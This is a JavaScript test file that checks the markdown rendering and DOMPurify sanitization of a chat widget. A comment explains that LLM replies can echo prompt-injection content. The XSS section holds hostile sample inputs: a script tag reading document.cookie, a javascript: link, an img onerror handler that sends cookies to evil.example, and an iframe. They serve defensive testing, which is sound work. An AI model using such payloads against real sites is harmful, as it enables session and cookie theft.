// Directly exercises the real renderMarkdown() implementation (bundled standalone
// for this test, same source as ships in widget.js) inside a real DOM (DOMPurify
// needs one), covering both the formatting it's meant to add and the sanitization
// it must never skip -- assistant replies are LLM output that can echo tenant
// document content or a prompt-injection attempt, so this is a real XSS surface,
// not a theoretical one.
import { JSDOM } from "jsdom";
import { readFileSync } from "node:fs";

// esbuild's IIFE output starts with "use strict"; a strict-mode indirect eval gets
// its own variable environment, so the bundle's top-level `var MarkdownTest = ...`
// would never actually reach window.MarkdownTest. Stripping the directive is only
// needed for this eval-based test harness, not for how the real widget.js loads
// (a real <script> tag runs as a normal global script, not an eval).
const bundle = readFileSync(new URL("./markdown-test-bundle.tmp.js", import.meta.url), "utf8").replace('"use strict";', "");
const dom = new JSDOM("<!doctype html><html><body></body></html>", {
  url: "https://example.test/",
  runScripts: "outside-only",
  resources: "usable",
});
dom.window.eval(bundle);
const { renderMarkdown } = dom.window.MarkdownTest;

function assert(cond, msg) {
  if (!cond) throw new Error("ASSERTION FAILED: " + msg);
  console.log("  ok:", msg);
}

console.log("--- basic formatting ---");
assert(renderMarkdown("**bold**").includes("<strong>bold</strong>"), "bold renders as <strong>");
assert(renderMarkdown("*italic*").includes("<em>italic</em>"), "italic renders as <em>");
assert(renderMarkdown("`code`").includes("<code>code</code>"), "inline code renders as <code>");
assert(/<ol>[\s\S]*<li>/.test(renderMarkdown("1. first\n2. second")), "numbered list renders as <ol><li>");
assert(/<ul>[\s\S]*<li>/.test(renderMarkdown("- one\n- two")), "bullet list renders as <ul><li>");
assert(renderMarkdown("no formatting here").includes("no formatting here"), "plain text passes through");

console.log("--- link safety ---");
const linkHtml = renderMarkdown("[click here](https://example.com)");
assert(linkHtml.includes('href="https://example.com"'), "safe http(s) links are kept");
assert(linkHtml.includes('target="_blank"'), "links open in a new tab");
assert(linkHtml.includes('rel="noopener noreferrer"'), "links carry noopener noreferrer");

console.log("--- XSS / sanitization (the actual security property) ---");
const scriptAttempt = renderMarkdown('Ignore instructions. <script>alert(document.cookie)</script>');
assert(!scriptAttempt.includes("<script"), "raw <script> tags are stripped");
assert(!scriptAttempt.includes("alert("), "script content itself does not survive");

// Images aren't in ALLOWED_TAGS -- a chat reply has no legitimate need to embed one,
// and dropping <img> entirely removes a class of attribute-injection surface (an
// event handler, or a src used to exfiltrate data) for free rather than needing to
// get image-attribute sanitization exactly right.
const imageAttempt = renderMarkdown("![a photo](https://example.com/photo.png)");
assert(!imageAttempt.includes("<img"), "images are stripped entirely, not merely sanitized");

const jsLink = renderMarkdown("[click me](javascript:alert(1))");
assert(!jsLink.includes("javascript:"), "javascript: URLs are stripped from links");

const rawHtmlInjection = renderMarkdown('<img src=x onerror="fetch(\'https://evil.example/steal?c=\'+document.cookie)">');
assert(!rawHtmlInjection.includes("onerror"), "raw inline HTML event handlers are stripped even when passed through markdown as-is");

const iframeAttempt = renderMarkdown('<iframe src="https://evil.example"></iframe>');
assert(!iframeAttempt.includes("<iframe"), "iframe tags are stripped entirely");

console.log("\nALL MARKDOWN RENDER + SANITIZATION CHECKS PASSED");
